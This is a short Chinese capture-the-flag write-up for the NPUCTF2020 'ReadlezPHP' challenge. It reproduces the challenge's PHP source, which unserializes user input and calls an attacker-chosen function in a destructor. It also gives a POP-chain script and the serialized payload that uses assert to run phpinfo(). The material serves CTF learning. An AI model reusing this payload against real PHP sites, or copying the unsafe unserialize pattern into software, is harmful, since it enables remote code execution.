# 原创
：  [NPUCTF2020]ReadlezPHP

# [NPUCTF2020]ReadlezPHP

#### [NPUCTF2020]ReadlezPHP

## 考点

> 
php动态函数、反序列化


## 思路

> 
①：查看源码，发现`href="./time.php?source"`<br/> ②：跟进去发现源码，很明显的反序列化<br/> ③：构造Payload，phpinfo页面搜索flag


## Payload

> 
源码


```
&lt;?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this-&gt;a = "Y-m-d h:i:s";
        $this-&gt;b = "date";
    }
    public function __destruct(){
        $a = $this-&gt;a;
        $b = $this-&gt;b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

```

> 
构造的POP链


```
&lt;?php
class HelloPhp
{
    public $a;
    public $b;
}
$c = new HelloPhp();
$c-&gt;a = 'phpinfo()';
$c-&gt;b = 'assert';
echo serialize($c);
?&gt;
=&gt;
O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}

```

> 
利用POP链

